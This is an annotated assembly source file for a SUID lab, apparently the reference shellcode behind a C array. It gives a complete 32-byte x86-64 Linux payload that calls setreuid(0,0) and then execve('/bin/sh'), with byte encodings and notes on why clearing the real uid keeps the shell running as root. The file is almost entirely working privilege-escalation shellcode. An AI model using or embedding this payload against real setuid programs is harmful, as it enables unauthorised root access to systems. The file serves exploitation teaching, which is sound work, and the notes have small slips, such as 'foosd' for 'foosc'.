; ============================================================================
; shellcode.S -- the reference shellcode for the SUID lab (foosc)
; ============================================================================
;
; This is the byte-for-byte source of the SHELLCODE[] array in ../foosc.c.
; `make verify` assembles it with nasm and diffs the result against the C
; array, so a hand-maintained hex dump can never silently drift from the
; source of truth. Run it, do not just trust it.
;
; WHAT IT DOES
; ------------
;   1. setreuid(0, 0)          -- make REAL and EFFECTIVE uid both root
;   2. execve("/bin/sh",0,0)   -- replace this process with a root shell
;
; WHY THE FIRST SYSCALL MUST EXIST -- the whole point of this lab
; ----------------------------------------------------------------
; When a setuid-root binary runs, Linux gives the process euid 0 but leaves
; ruid = the launching user (e.g. 1000). Now:
;
;   * execve() alone does NOT change the uids. euid stays 0 *in the process*.
;     But bash and dash, on startup, compare euid against ruid, and when they
;     differ (and -p is not given) they RESET euid = ruid -- the shell's own
;     defence against exactly this attack. Result: plain execve("/bin/sh")
;     from a setuid process gives you a shell that is NOT root.
;
;   * setuid(0) is NOT enough either. On Linux, an unprivileged... no: even a
;     privileged setuid(0) sets euid=0 (and saved=0) but LEAVES ruid
;     untouched. bash still sees euid(0) != ruid(1000) and still resets.
;
;   * setreuid(0, 0) sets BOTH ruid and euid to 0 (and, because euid 0 is
;     privileged, saved too). bash now starts with euid == ruid == 0 and
;     keeps root.
;
; So "clear the real uid as well" is not paranoia -- it is the *only* way a
; /bin/sh payload gets a root shell out of a setuid binary on a modern
; system. This is why the classic 24-byte shellcode you find all over the
; internet opens with a uid-clearing syscall.
;
; Register usage follows the System V AMD64 ABI: first integer args in
; rdi, rsi, rdx; syscall number in rax.
; ============================================================================

BITS 64

; ---------------------------------------------------------------------------
; 1) setreuid(0, 0)
;    Linux x86-64 syscall 113: int setreuid(uid_t ruid, uid_t euid);
; ---------------------------------------------------------------------------

    xor    edi, edi            ; 31 ff            rdi = 0  -> ruid = 0
    xor    esi, esi            ; 31 f6            rsi = 0  -> euid = 0
    push   0x71                ; 6a 71            113 = __NR_setreuid
    pop    rax                 ; 58               rax = 113
    syscall                    ; 0f 05            enter the kernel

; NOTES ON THE ENCODING:
;   * `xor edi,edi` is 2 bytes and zeroes the full 64-bit rdi. "xor reg,reg"
;     is the canonical way to zero a register -- not "mov 0", which is larger
;     and a lot of CPUs special-case the xor anyway.
;   * `push 0x71 ; pop rax` loads a small constant without a 7-byte
;     `mov rax, imm64`. Pushing an imm8 sign-extends it to 64 bits; 0x71 =
;     113 fits, so this is both smaller and has no NUL bytes to worry about.
;   * We deliberately do NOT check the syscall return: if foosd was NOT built
;     setuid this fails with EPERM, and falling through to execve is exactly
;     what we want (a plain, non-root shell) so the lab works both ways.

; ---------------------------------------------------------------------------
; 2) execve("/bin/sh", argv = NULL, envp = NULL)
;    Linux x86-64 syscall 59
; ---------------------------------------------------------------------------

    xor    esi, esi            ; 31 f6            rsi = 0  (argv = NULL)
    xor    edx, edx            ; 31 d2            rdx = 0  (envp = NULL)
    movabs rdi, 0x0068732f6e69622f
                               ; 48 bf 2f 62 69 6e 2f 73 68 00
                               ; rdi = "/bin/sh\0" as one little-endian word
    push   rdi                 ; 57               put the string on the stack
    mov    rdi, rsp            ; 48 89 e7         rdi = pointer to the string
    push   0x3b                ; 6a 3b            59 = execve
    pop    rax                 ; 58               rax = 59
    syscall                    ; 0f 05            replace this process

; WHY THE STRING IS BUILT THIS WAY:
;   * There is no "push imm64"; the widest push immediate is sign-extended to
;     32 bits, so "/bin/sh\0" (8 bytes) cannot be pushed directly. Loading it
;     into a register with movabs and pushing the register is the standard
;     trick. The little-endian word 0x0068732f6e69622f is the bytes
;     2f 62 69 6e 2f 73 68 00 = "/bin/sh\0": the 8th byte is the NUL
;     terminator, carried "for free" in the register.
;   * argv=NULL/envp=NULL is legal for execve and keeps the payload tiny.
;     A real exploit would pass an argv with the path for maximum shell
;     compatibility; this lab's target shell (bash via /bin/sh) is happy.

; TOTAL: 32 bytes.